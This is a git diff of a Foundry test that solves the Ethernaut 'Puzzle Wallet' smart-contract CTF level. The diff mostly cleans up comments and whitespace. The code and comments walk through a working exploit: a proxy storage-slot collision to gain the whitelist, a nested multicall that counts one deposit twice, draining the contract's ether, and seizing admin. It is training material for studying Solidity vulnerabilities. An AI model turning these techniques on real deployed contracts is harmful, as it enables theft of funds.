@@ -34,17 +34,16 @@ contract PuzzleWalletTest is Test, BaseTest {
     function exploitLevel() internal override {
         vm.startPrank(player, player);
 
-        // This level is simple but a little bit tricky. 
-        // First thing to know is that delegatecall always execute the call in the context of the calling contract. An important thing to note is that when a contract makes a delegatecall, the value of address(this), msg.sender, and msg.value do not change their values. This is because delegatecall forwards the entire message (includingmsg.sender and msg.value) to the target contract but executes the called contract’s code in the context of the calling contract.
+        // This level is simple but a little bit tricky.
+        // First thing to know is that delegatecall always execute the call in the context of the calling contract. An important thing to note is that when a contract makes a delegatecall, the value of address(this), msg.sender, and msg.value do not change their values. This is because delegatecall forwards the entire message (including msg.sender and msg.value) to the target contract but executes the called contract’s code in the context of the calling contract.
         // More details : https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7
-        
 
-        // Now that we know this, we know that changing maxBalance variable would also change the value of the admin in the proxy 
-        
+        // Now that we know this, we know that changing maxBalance variable would also change the value of the admin in the proxy
+
         // First we need to whitelist ourself to be able to run PuzzleWallet functions.
         // Changing pendingAdmin in the proxy would mean that the owner of PuzzleWallet has changed because they are in the same storage slot. After that we whitelist ourselves.
         PuzzleProxy(instance).proposeNewAdmin(player);
-        instanceContract.addToWhitelist(player);
+        instanceContract.addToWhitelist(player); // need to use PuzzleWallet(instance) so that the function implementation can be found in the contract
 
         // Now for the tricky part
         // The objective is to empty the contract so that we can run setMaxBalance
@@ -55,21 +54,20 @@ contract PuzzleWalletTest is Test, BaseTest {
         bytes[] memory multiCallData = new bytes[](1);
         data[0] = abi.encodeWithSelector(instanceContract.deposit.selector);
 
-        // The check require(!depositCalled, "Deposit can only be called once"); does not allow us to send another deposit call for the multicall
+        // The check require(!depositCalled, "Deposit can only be called once"); does not allow us to send another deposit call for the same multicall
         // But we can bypass it by calling multicall again inside the first multicall and giving it the deposit function selector as data parameter. bool depositCalled = false; will be initiated again inside the second call and we will be able to call deposit inside the second call.
         multiCallData[0] = abi.encodeWithSelector(instanceContract.deposit.selector);
         data[1] = abi.encodeWithSelector(instanceContract.multicall.selector, multiCallData);
 
-        instanceContract.multicall{value : 0.001 ether}(data);
-        
+        instanceContract.multicall{value: 0.001 ether}(data);
+
         // Now our deposit balance is the same as the actual contract ether balance
         // Let's just empty the contract and call setMaxBalance with our address
         instanceContract.execute(player, instance.balance, "");
         instanceContract.setMaxBalance(uint256(uint160(player)));
 
         // DONE !
-        
-        vm.stopPrank();
 
+        vm.stopPrank();
     }
 }
